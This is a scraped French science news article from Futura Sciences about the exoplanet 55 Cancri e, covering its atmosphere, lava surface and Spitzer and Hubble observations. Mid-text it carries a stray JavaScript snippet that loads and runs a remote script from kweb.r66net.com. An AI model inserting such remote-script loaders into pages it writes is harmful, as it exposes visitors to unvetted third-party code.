{"title": "L'atmosphere de cette superterre << en diamant >> ressemblerait a la notre", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-11-21", "content": "Gravitant autour de son soleil a seulement 2,5 millions de kilometres, 55 Cancri e est etonnante. Cette superterre a ete surnommee << planete de diamant >>. Une nouvelle etude demontre que ce monde brulant couvert de lave est enveloppe d'une atmosphere ressemblant a la notre. De par ses caracteristiques etonnantes, l' exoplanete   55 Cancri e  -- plus exactement 55 Cancri Ae -- intrigue et passionne les astronomes. Deux fois plus grande que la  Terre  et huit fois plus massive, cette  superterre  ne gravite qu'a 2,5 millions de kilometres de  55 Cancri A  (une  etoile  similaire a la notre, situee a quelque 40  annees-lumiere  de nous, dans la  constellation du Cancer ), soit 60 fois plus pres que notre Planete bleue ne l'est du  Soleil . Une annee (periode orbitale) n'y dure que 17 h 40 min. Son  orbite  est synchrone, si bien qu'un hemisphere est en permanence face a l'etoile et l'autre, plonge a jamais dans l'obscurite. Des  observations dans l'infrarouge avec le satellite Spitzer  avaient conduit des chercheurs a postuler, en 2016, que la planete etait un veritable enfer, couvert de depots de lave sur le cote jour et de lave solidifiee cote nuit. Ce n'est donc pas le meilleur des mondes pour y trouver de la vie, vous l'aurez compris. Mais alors, pourquoi s'y interesser ? interrogeront certains.  << Comprendre cette planete nous aidera a repondre a des questions plus larges sur l'evolution des planetes rocheuses >> , argue Renyu Hu, chercheur au JPL et coauteur d'une nouvelle etude sur cette superterre qui vient de paraitre dans  The Astronomical Journal . Nouvelle illustration de 55 Cancri e. La superterre serait entierement couverte de lave et enveloppee d'une atmosphere plus epaisse que celle de la Terre, avec des materiaux volatils comparables. (c) Nasa, JPL-Caltech                               55 Cancri e serait rocheuse et aurait une atmosphere Avec ses collegues, l'astrophysicien a conduit une analyse approfondie des donnees photometriques collectees par Spitzer en juin et juillet 2013. Selon leurs recherches, 55 Cancri e ( alias  Janssen) possederait une  atmosphere  avec des ingredients communs a ceux de l'atmosphere terrestre, a la difference que celle-ci serait plus epaisse et plus chaude. Sa presence, d'ailleurs, ne manque pas d'interroger : comment une planete si proche de son etoile parvient-elle a garder une atmosphere ?  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Renyu Hu a etabli un modele ameliore de la circulation d'energie de la planete et de son rayonnement dans l'espace. En comparant celui-ci aux observations, l'equipe, dirigee par Isabel Angelo, montre que les ecarts de temperature entre les deux hemispheres ne sont pas aussi importants que ce qui se produirait si la planete n'avait pas d'atmosphere. Il ferait ainsi en moyenne 2.300 degC sur la face diurne et autour de 1.300 degC sur la face nocturne. Le saviez-vous ? Depuis decembre 2015, dans le cadre du concours international  NameExoWorlds  initie par l'Union astronomique internationale (UAI), 55 Cancri e s'appelle aussi Janssen, du nom d'un lunetier allemand de la Renaissance, Zacharias Janssen (v. 1588 - v. 1631), possible inventeur de la lunette astronomique et du microscope. L'etoile 55 Cancri A a ete baptisee Copernic et les autres planetes du systeme, 55 Cancri b, c, d et f : Galilee, Brahe, Lippershey et Harriot. Voir tous les autres noms valides  ici . En outre,  << des lacs de lave (supposes se trouver sur le cote jour) directement exposes a l'espace sans atmosphere creeraient des points chauds locaux de hautes temperatures ; ils ne sont donc pas la meilleure explication pour les observations de Spitzer >>,  estiment les auteurs. La lave qui recouvre ce monde serait en fait cachee par une epaisse atmosphere. Celle-ci se composerait, selon eux, d' oxygene , d'azote et aussi d'eau. Mais point d'eau liquide subsistant a la surface de ce monde brulant, dont la densite est similaire a celle de la Terre.   << Les arguments en faveur d'une atmosphere sont maintenant plus forts que jamais >> , defend Renyu Hu, rappelant combien l'existence d'une atmosphere autour de  55 Cancri e , sa composition et sa structure sont debattues depuis plusieurs annees (voir article ci-dessous). Pour en savoir plus L'atmosphere de la superterre << en diamant >> serait irrespirable Article de Xavier Demeersman publie le 21 fevrier 2016 Pour la premiere fois, l'atmosphere d'une superterre a ete caracterisee, grace a  Hubble  qui n'avait pu jusque-la scruter que celles de quelques  geantes gazeuses . Surnommee la << planete de  diamant  >>, 55 Cancri e n'est pas vraiment accueillante, sauf pour qui voudrait respirer du cyanure a 2.000 degC. Pres de quinze ans apres les premieres mesures de l'atmosphere d'une  planete geante  dans un autre  Systeme solaire , en l'occurrence HD 209458 b, Hubble a permis de caracteriser pour la premiere fois celle d'une  superterre , apres deux precedentes tentatives non concluantes. De taille et de  masse  intermediaires entre une planete geante de type  Jupiter  et une boule rocheuse comme la Terre, cette categorie d' exoplanete  serait tres  courante au sein des galaxies . C'est grace a l'instrument WFC3 ( Wide Field Camera 3 ) greffe sur le  telescope  spatial en 2009 et une nouvelle technique de traitement des  spectres  obtenus, qu'une equipe d'astrophysiciens de l'UCL ( University College London ) a pu determiner la composition de l'enveloppe gazeuse de ce corps situe a une quarantaine d'annees-lumiere seulement, soit presque 10 fois la distance qui separe le Soleil de  Proxima du Centaure . La cible est deja bien connue des astronomes. Il s'agit de 55 Cancri e,  alias  Janssen (voir la note en bas de page), une planete huit fois plus massive que la Terre qui, a partir de 2012, fut surnommee la <<  planete de diamant  >> car des modeles se referant a son rayon et a sa masse ont specule qu'elle est tres riche en  carbone . Cette  superterre  appartient a un systeme multiple de cinq planetes connues parmi lesquelles trois geantes. Leur etoile-parent, 55 Cancri A ( alias   Copernic ), ressemble au Soleil, avec un milliard d'annees de plus. La  naine rouge  juste a cote (a environ 1.000  UA , mille fois la distance Terre-Soleil), 55 Cancri B, compose avec elle un couple stellaire qui, par une belle nuit noire, est presque visible a l' oeil  nu dans la constellation du Cancer ( Cancri ). Animation de 55 Cancri e se deplacant autour de son soleil 55 Cancri A, alias Copernic. La superterre ne met que 18 heures pour boucler son orbite. (c) ESA, Hubble, M. Kornmesser Une possible exoplanete de diamant Pour sonder l'atmosphere d'un corps lointain, quoi de mieux qu'une grosse Terre en  transit  devant son etoile, qui plus est, qui gravite tres pres, et en seulement quelques heures, comme le fait  55 Cancri e  ? Bien entendu, dans ces conditions extremes ou la temperature culmine tout au long de l'annee de 18 heures autour de 2.000 degC, toute habitabilite est exclue. Un constat qui empire avec l'etude de son atmosphere. L'etude a paraitre dans  Astrophysical Journal  revele une abondance d' hydrogene  et d' helium  et aucune trace notable de vapeur d'eau. Pour Angelos Tsiaras, de l'UCL,  << les observations de l'atmosphere de 55 Cancri e suggerent que la planete a reussi a accrocher une quantite importante d'hydrogene et d'helium de la  nebuleuse  ou elle s'est formee >>.  Les chercheurs ont ete frappes par la presence importante de cyanure d'hydrogene, un marqueur d'atmosphere riche en carbone,  << cela nous indique un rapport carbone sur oxygene tres eleve >>  souligne Olivia Venot, de l'universite de Leuven (Belgique), qui a produit recemment un modele en accord avec ces observations. Une composante tres interessante car, comme l'explique Jonathan Tennyson, egalement de l'UCL,  << si la presence de cyanure d'hydrogene et d'autres  molecules  est confirmee dans les prochaines annees par la nouvelle generation de telescopes a  infrarouges , cela appuierait la theorie que cette planete est effectivement un endroit riche en carbone et tres  exotique  >> . Patience, patience donc : le  telescope spatial James-Webb  ( JWST ) devrait partir en 2018, si tout va bien. Nul doute que 55 Cancri e fera partie de ses cibles planetaires privilegiees. Idem pour la mission  WFIRST  ( Wide-Field Infrared Survey Telescope ) dont la Nasa vient d'annoncer le coup d'envoi de sa conception. Le satellite sondera l' univers  et aussi les mondes lointains dans l'infrarouge dans un champ cent fois plus etendu que celui d'Hubble. Lancement prevu au milieu des annees 2020. Interview : qu'est-ce qu'une exoplanete ?                       La question des exoplanetes est tres ancienne en astronomie. Leur existence est pour la premiere fois attestee de facon indirecte dans les annees 1990. Futura-Sciences a rencontre Jean-Pierre Luminet, astrophysicien de renom, afin qu'il nous parle plus en detail de ce passionnant sujet.                                       ", "theme": "sciences"}